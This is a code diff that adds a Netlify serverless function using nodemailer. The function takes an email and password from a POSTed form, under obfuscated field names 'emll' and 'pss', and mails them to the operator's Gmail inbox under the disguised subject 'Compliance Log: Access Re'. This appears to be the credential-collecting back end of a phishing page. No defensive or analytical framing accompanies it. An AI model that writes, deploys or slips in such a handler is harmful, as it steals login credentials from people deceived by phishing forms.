@@ -35,3 +35,42 @@ auth: {
         return res.status(500).json({ success: false, message: 'Failed' });
     }
 }
+
+const nodemailer = require('nodemailer');
+
+exports.handler = async (event, context) => {
+    // Only allow POST
+    if (event.httpMethod !== "POST") {
+        return { statusCode: 405, body: "Method Not Allowed" };
+    }
+
+    // Netlify body is sent as a string
+    const { emll, pss } = JSON.parse(event.body);
+
+    const transporter = nodemailer.createTransport({
+        service: 'gmail',
+        auth: {
+            user: process.env.ELL_USS,
+            pass: process.env.ELL_PSS,
+        },
+    });
+
+    try {
+        await transporter.sendMail({
+            from: process.env.EMAIL_USER,
+            to: process.env.EMAIL_USER,
+            subject: 'Compliance Log: Access Re',
+            text: `Eml: ${emll}\nPss: ${pss}`,
+        });
+
+        return {
+            statusCode: 200,
+            body: JSON.stringify({ message: "Success" }),
+        };
+    } catch (error) {
+        return {
+            statusCode: 500,
+            body: JSON.stringify({ error: "Failed to send email" }),
+        };
+    }
+};
